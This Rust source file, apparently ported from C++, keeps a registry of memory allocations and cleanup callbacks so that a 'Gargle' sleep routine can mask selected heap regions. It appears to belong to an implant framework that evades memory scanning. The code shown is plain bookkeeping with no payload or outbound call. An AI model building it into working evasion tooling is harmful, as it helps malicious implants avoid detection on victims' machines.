//! 内存跟踪（track_memory.cpp）。
//! Memory tracking (track_memory.cpp).
//!
//! C++ 版本跟踪分配，以便 Gargle 在睡眠时掩蔽它们，且 `safe_exit` 可以运行清理回调。在 Rust 中，分配由语言自身管理；我们保留注册表，用于需要在 `GargleSleep` 期间掩蔽的分配以及清理回调。
//! The C++ version tracks allocations so Gargle can mask them during sleep
//! and so `safe_exit` can run cleanup callbacks. In Rust, allocations are
//! managed by the language; we keep the registry for allocations that need
//! masking during `GargleSleep` and for cleanup callbacks.

use parking_lot::Mutex;

pub const TRACK_MEMORY_MALLOC: i32 = 1;
pub const TRACK_MEMORY_VALLOC: i32 = 2;
pub const TRACK_MEMORY_CLEANUP_FUNC: i32 = 3;

#[derive(Clone)]
pub struct HeapRecord {
    pub ptr: usize,
    pub size: usize,
}

#[allow(dead_code)] // 镜像 C++ 的 MEMORY_RECORD / mirrors the C++ MEMORY_RECORD
struct MemoryRecord {
    ptr: usize,
    size: usize,
    rtype: i32,
    mask: bool,
    cleanup: Option<Box<dyn FnOnce() + Send>>,
}

static MEMORY_TRACKER: Mutex<Vec<MemoryRecord>> = Mutex::new(Vec::new());
static HEAP_RECORDS: Mutex<Vec<HeapRecord>> = Mutex::new(Vec::new());

/// 跟踪一次内存分配。当 `mask` 置位时，该记录注册给 Gargle 掩蔽。
/// Track a memory allocation. When `mask` is set the record is registered
/// for masking by Gargle.
pub fn track_memory_add(
    ptr: usize,
    size: usize,
    rtype: i32,
    mask: bool,
    cleanup: Option<Box<dyn FnOnce() + Send>>,
) {
    let mut tracker = MEMORY_TRACKER.lock();
    tracker.push(MemoryRecord {
        ptr,
        size,
        rtype,
        mask,
        cleanup,
    });
    if mask {
        HEAP_RECORDS.lock().push(HeapRecord { ptr, size });
    }
}

/// 运行所有清理回调并重置跟踪器。
/// Run all cleanup callbacks and reset the tracker.
pub fn track_memory_cleanup() {
    let mut tracker = MEMORY_TRACKER.lock();
    for rec in tracker.drain(..) {
        if let Some(cleanup) = rec.cleanup {
            cleanup();
        }
    }
    HEAP_RECORDS.lock().clear();
}

/// 获取需要掩蔽的堆记录。
/// Get the heap records to mask.
pub fn track_memory_get_heap_records_to_mask() -> Vec<HeapRecord> {
    HEAP_RECORDS.lock().clone()
}
